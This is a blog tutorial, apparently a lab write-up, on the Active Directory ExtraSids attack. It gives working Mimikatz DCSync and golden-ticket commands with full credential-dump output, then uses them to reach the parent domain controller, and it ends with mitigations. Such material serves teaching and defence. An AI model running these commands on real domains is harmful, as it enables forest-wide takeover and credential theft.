---
title: "Active Directory Series - ExtraSIDs Attack with Mimikatz - Episode 03"
datePublished: Wed Mar 27 2024 20:00:58 GMT+0000 (Coordinated Universal Time)
cuid: clua8dsw4000508l7fmbnamfl
slug: active-directory-series-extrasids-attack-with-mimikatz-episode-03

---

Objective: To provide a comprehensive, step-by-step guide for executing the ExtraSids attack using Mimikatz, enabling learners to understand the concepts and techniques involved in compromising a parent domain from a compromised child domain.

Section 1: Understanding the ExtraSids Attack

1.1 What is the ExtraSids Attack?

* Explanation: The ExtraSids attack allows an attacker to compromise a parent domain from a compromised child domain within the same Active Directory forest.
    
* Key Concepts:
    
    * SID Filtering: A protection mechanism that filters out authentication requests from a domain in another forest across a trust.
        
    * sidHistory Attribute: An attribute that, when set to the Enterprise Admins group SID, grants administrative access to the entire forest.
        
    * Golden Ticket: A forged Kerberos ticket created using the KRBTGT account's hash, granting unauthorized access to resources.
        

1.2 Prerequisites for the ExtraSids Attack To perform the ExtraSids attack, the following information is required:

1. The KRBTGT hash for the child domain
    
2. The SID for the child domain
    
3. The name of a target user in the child domain (can be a non-existent user)
    
4. The FQDN of the child domain
    
5. The SID of the Enterprise Admins group in the root domain
    

Checkpoint 1: What is the purpose of the ExtraSids attack, and what are the key prerequisites for executing it?

Section 2: Gathering the Required Information

2.1 Obtaining the KRBTGT Account's NT Hash

* Explanation: The KRBTGT account's NT hash is used to create a Golden Ticket, which is essential for the ExtraSids attack.
    
* Step-by-Step using Mimikatz:
    
    1. Open a command prompt and run `mimikatz.exe`.
        
    2. Execute the command `lsadump::dcsync /user:CHILDOMAIN\\krbtgt` to retrieve the KRBTGT account's NT hash.
        
    
    ```go
    
    mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt
    [DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
    [DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
    [DC] 'LOGISTICS\\krbtgt' will be the user account
    [rpc] Service  : ldap
    [rpc] AuthnSvc : GSS_NEGOTIATE (9)
    
    Object RDN           : krbtgt
    
    ** SAM ACCOUNT **
    
    SAM Username         : krbtgt
    Account Type         : 30000000 ( USER_OBJECT )
    User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
    Account expiration   :
    Password last change : 11/1/2021 11:21:33 AM
    Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
    Object Relative ID   : 502
    
    Credentials:
      Hash NTLM: 9d765b482771505cbe97411065964d5f
        ntlm- 0: 9d765b482771505cbe97411065964d5f
        lm  - 0: 69df324191d4a80f0ed100c10f20561e
    
    Supplemental Credentials:
    * Primary:NTLM-Strong-NTOWF *
        Random Value : 8c6b7919c01a5c654c91922f9a13225c
    
    * Primary:Kerberos-Newer-Keys *
        Default Salt : LOGISTICS.INLANEFREIGHT.LOCALkrbtgt
        Default Iterations : 4096
        Credentials
          aes256_hmac       (4096) : d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
          aes128_hmac       (4096) : ca289e175c372cebd18083983f88c03e
          des_cbc_md5       (4096) : fee04c3d026d7538
    
    * Primary:Kerberos *
        Default Salt : LOGISTICS.INLANEFREIGHT.LOCALkrbtgt
        Credentials
          des_cbc_md5       : fee04c3d026d7538
    
    * Packages *
        NTLM-Strong-NTOWF
    
    * Primary:WDigest *
        01  71fc2147dcf21fed982e180c3ebc48b8
        02  e193e66c97fb2ff16f352c25c06a5009
        03  9b4087c331fcd37671b407cb4f0e44a2
        04  71fc2147dcf21fed982e180c3ebc48b8
        05  e193e66c97fb2ff16f352c25c06a5009
        06  0da90377100224d5635e529d358f1409
        07  71fc2147dcf21fed982e180c3ebc48b8
        08  1763ae4e99694dcf66700106bb303aa5
        09  024c0c0c71f6e1f89a8c3be922534f0d
        10  3523e29569b4a45d20d99b7937f40326
        11  1763ae4e99694dcf66700106bb303aa5
        12  024c0c0c71f6e1f89a8c3be922534f0d
        13  5f47d51dee42d3f9a52a2d464c291fe5
        14  1763ae4e99694dcf66700106bb303aa5
        15  b7196b13a4fc2a29c18de543912039c2
        16  64689c7d74d2f2908330c62e47b34d75
        17  023f316da4715dd596d4ae6d5b9049cc
        18  fec7644b22077323cc9770c91d205269
        19  5cacbc938eaeb1b3a58572dafed92d97
        20  684ef5f716d49e4274a4ceb48d5fd6ba
        21  99968ef6b4c440cbd652ce6718a9ba39
        22  99968ef6b4c440cbd652ce6718a9ba39
        23  fbd2d7aef9329e981cd1bfdef2924843
        24  38653e1cf10018a3ae60fdb681241f1b
        25  5efd3ccfb3589c3bd6d76738ceeffb92
        26  dcd5dfeec024fe725edcaab5953d2011
        27  d92dcf29cd473a6ebae4b3bca1e578a9
        28  ff0382afc6adb89c00d5bf90cd5f4eca
        29  d7d958214c25d0835547320a0f0faf49
    ```
    

2.2 Obtaining the Child Domain SID

* Explanation: The child domain SID is required to create the Golden Ticket for the ExtraSids attack.
    
* Step-by-Step using PowerView:
    
    1. Load the PowerView module into your PowerShell session.
        
    2. Execute the command `Get-DomainSID` to retrieve the child domain SID.
        
    
    ```powershell
    PS C:\\Tools\\mimikatz\\x64> cd ..
    PS C:\\Tools\\mimikatz> cd ..
    PS C:\\Tools> import-module .\\PowerView.ps1
    PS C:\\Tools> Get-DomainSID
    S-1-5-21-2806153819-209893948-922872689
    PS C:\\Tools>
    ```
    

2.3 Obtaining the Enterprise Admins Group SID

* Explanation: The Enterprise Admins group SID is used to grant administrative access to the entire forest during the ExtraSids attack.
    
* Step-by-Step using PowerView:
    
    1. Load the PowerView module into your PowerShell session.
        
    2. Execute the command `Get-DomainGroup -Domain PARENTDOMAIN -Identity "Enterprise Admins" | select distinguishedname,objectsid` to retrieve the Enterprise Admins group SID.
        
    
    ```powershell
    PS C:\\Tools> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
    
    distinguishedname                                       objectsid
    -----------------                                       ---------
    CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
    
    PS C:\\Tools>
    ```
    

2.4 Hight all prerequisites for creating gold tickets:

&lt;aside&gt; 💡 Run Mimikatz to retrieve the KRBTGT hash for the child domain:

```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\\\\krbtgt
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\\\\krbtgt' will be the user account
Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e
```

&lt;/aside&gt;

&lt;aside&gt; 💡 Retrieve the distinguished name and object SID of the Enterprise Admins group for the parent domain:

```powershell
distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519

```

&lt;/aside&gt;

&lt;aside&gt; 💡 Get the SID for the child domain:

```powershell
PS C:\\\\Tools> Get-DomainSID
S-1-5-21-2806153819-209893948-922872689

```

&lt;/aside&gt;

2.5 Confirming no access to domain controller before retrieving gold tickets

```powershell
PS C:\\Tools> ls \\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\C$
ls : Access is denied
At line:1 char:1
+ ls \\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\C$
```

Checkpoint 2: What are the steps to obtain the KRBTGT account's NT hash, child domain SID, and Enterprise Admins group SID using Mimikatz and PowerView?

Section 3: Ex-ecuting the ExtraSids Attack

3.1 Creating a Golden Ticket with Mimikatz

* Step-by-Step:
    
    1. Open a command prompt and run `mimikatz.exe`.
        
    2. Execute the following command, replacing the placeholders with the gathered information:
        
        ```powershell
        kerberos::golden /user:USERNAME /domain:CHILDOMAIN.FQDN /sid:CHILDOMAIN_SID /krbtgt:KRBTGT_HASH /sids:ENTERPRISE_ADMINS_SID /ptt
        
        ```
        
    3. Mimikatz will create a Golden Ticket with the specified parameters and inject it into the current session.
        
    
    ```powershell
    mimikatz.exe
    
    mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
    User      : hacker
    Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
    SID       : S-1-5-21-2806153819-209893948-922872689
    User Id   : 500
    Groups Id : *513 512 520 518 519
    Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
    ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
    Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
    -> Ticket : ** Pass The Ticket **
    
     * PAC generated
     * PAC signed
     * EncTicketPart generated
     * EncTicketPart encrypted
     * KrbCred generated
    
    Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
    ```
    

3.2 Verifying the Golden Ticket

* Step-by-Step using klist:
    
    1. Open a command prompt and run `klist` to view the cached Kerberos tickets.
        
    2. Verify that the Golden Ticket for the specified user is listed, with the correct domain and ticket flags.
        

3.3 Accessing Resources in the Parent Domain

* Explanation: With the Golden Ticket injected, the attacker can now access resources in the parent domain as if they were a member of the Enterprise Admins group.
    
* Example:
    
    * Listing the contents of the parent domain's Domain Controller's C: drive:
        
        ```powershell
        Copy codels \\\\PARENTDC.PARENTDOMAIN.FQDN\\c$
        
        ```
        
* Got the flag
    

```powershell

PS C:\\Tools\\mimikatz\\x64> type \\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\C$\\ExtraSids\\flag.txt
f@ll1ng_l1k3_d0m1no3$
PS C:\\Tools\\mimikatz\\x64>
```

Checkpoint 3: What are the steps to create a Golden Ticket using Mimikatz, and how can you verify that the ticket is successfully injected?

Section 4: Mitigating the ExtraSids Attack

4.1 Implementing SID Filtering

* Explanation: SID Filtering helps prevent the ExtraSids attack by filtering out authentication requests from untrusted domains.
    
* Best Practices:
    
    * Enable SID Filtering on all domain trusts to restrict access to resources based on the domain SID.
        
    * Regularly review and update SID Filtering configurations to ensure they remain effective.
        

4.2 Securing Privileged Accounts

* Explanation: Limiting the exposure of privileged accounts can reduce the risk of the ExtraSids attack.
    
* Best Practices:
    
    * Follow the principle of least privilege and grant administrative access only when necessary.
        
    * Implement strong password policies and regularly rotate passwords for privileged accounts.
        
    * Enable multi-factor authentication for privileged accounts to add an extra layer of security.
        

4.3 Monitoring and Auditing

* Explanation: Regularly monitoring and auditing Active Directory can help detect and respond to suspicious activities, including the ExtraSids attack.
    
* Best Practices:
    
    * Enable detailed auditing of Active Directory events, especially those related to privileged accounts and trust relationships.
        
    * Implement a Security Information and Event Management (SIEM) system to correlate and analyze logs from multiple sources.
        
    * Establish an incident response plan to quickly investigate and mitigate potential security breaches.
        

Checkpoint 4: What are some best practices for mitigating the ExtraSids attack, and how can monitoring and auditing help detect suspicious activities?

Section 5: Conclusion and Further Learning

5.1 Recap of Key Points

* The ExtraSids attack allows an attacker to compromise a parent domain from a compromised child domain within the same Active Directory forest.
    
* The attack requires gathering specific information, such as the KRBTGT account's NT hash, child domain SID, and Enterprise Admins group SID.
    
* Mimikatz is used to create a Golden Ticket with the gathered information, granting unauthorized access to resources in the parent domain.
    
* Implementing SID Filtering, securing privileged accounts, and regular monitoring and auditing can help mitigate the risk of the ExtraSids attack.
    

5.2 Practical Exercises

* Exercise 1: Set up a lab environment with a parent domain and a child domain. Compromise the child domain and perform the ExtraSids attack to gain unauthorized access to the parent domain.
    
* Exercise 2: Implement SID Filtering on the trust between the parent and child domains, and attempt the ExtraSids attack again to observe the impact of the mitigation.
    

5.3 Additional Resources

* "Mimikatz: Active Directory Security Technical Implementation Guide" by Ired.team ([https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain))
    
* "Active Directory Security" course by Nikhil Mittal ([https://www.pentesteracademy.com/activedirectorysecurity](https://www.pentesteracademy.com/activedirectorysecurity))
    
* "Kerberos & Active Directory Exploitation" course by Pentester Academy ([https://www.pentesteracademy.com/course?id=31](https://www.pentesteracademy.com/course?id=31))
    

The ExtraSids attack is a powerful technique that can lead to complete compromise of an Active Directory forest. As a learner, it is essential to understand the concepts and techniques involved in executing this attack and, more importantly, the best practices for mitigating it. Always use this knowledge responsibly and with proper authorization. Happy learning!